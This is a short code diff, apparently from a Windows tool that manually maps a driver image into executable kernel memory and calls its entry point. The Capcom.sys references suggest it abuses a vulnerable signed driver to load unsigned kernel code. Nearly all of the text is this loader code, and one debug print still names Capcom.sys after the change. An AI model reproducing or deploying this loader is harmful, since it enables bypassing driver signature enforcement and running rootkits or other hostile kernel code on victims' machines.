@@ -11,28 +11,31 @@ DECLARE_UNICODE_STRING(strAllocPoolWithTag, L"ExAllocatePoolWithTag");
 
 HMODULE PayloadImage;
 SIZE_T PayloadSize;
-SIZE_T PayloadEntry;
+DWORD PayloadEntryRVA;
+void (__stdcall *PayloadEntry)(PVOID DriverObject, PVOID RegistryEntry);
 
 PVOID NTAPI LoaderPayload(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress)
 {
-	__debugbreak();
-
 	// Allocate executable unpaged memory for driver
-	PVOID drvmap = K_GetRoutine(ExAllocatePoolWithTag)(NonPagedPoolExecute, DriverLoader::TargetDriverPE.size(), '\0kdD');
+	PVOID drvmap = K_GetRoutine(ExAllocatePoolWithTag)(NonPagedPoolExecute, PayloadSize, '\0kdD');
 	if (drvmap)
 	{
 		// Nice intrinsic trick from https://github.com/Professor-plum/Reflective-Driver-Loader/blob/master/Hadouken/Hadouken.c
 		__movsq((PDWORD64)drvmap, (PDWORD64)PayloadImage, (SIZE_T)(PayloadSize / sizeof(INT64)));
+
+		PayloadEntry = MakePointer<decltype(PayloadEntry)>(drvmap, PayloadEntryRVA);
+		__debugbreak();
+		PayloadEntry(NULL, NULL);
 	}
 	return nullptr;
 } 
 
 int main()
 {
-	auto image = make_unique<PEImage>(L"Capcom.sys");
+	auto image = make_unique<PEImage>(L"TestDriver.sys");
 	PayloadImage = image->MapForKernel();
 	PayloadSize = image->GetMappedSize();
-	PayloadEntry = image->GetEntryPointRVA();
+	PayloadEntryRVA = image->GetEntryPointRVA();
 
 	Util::DebugPrint("Mapped Capcom.sys to: %p\n", PayloadImage);
 	Util::DebugPrint("EntryPointRVA: %p\n", PayloadEntry);
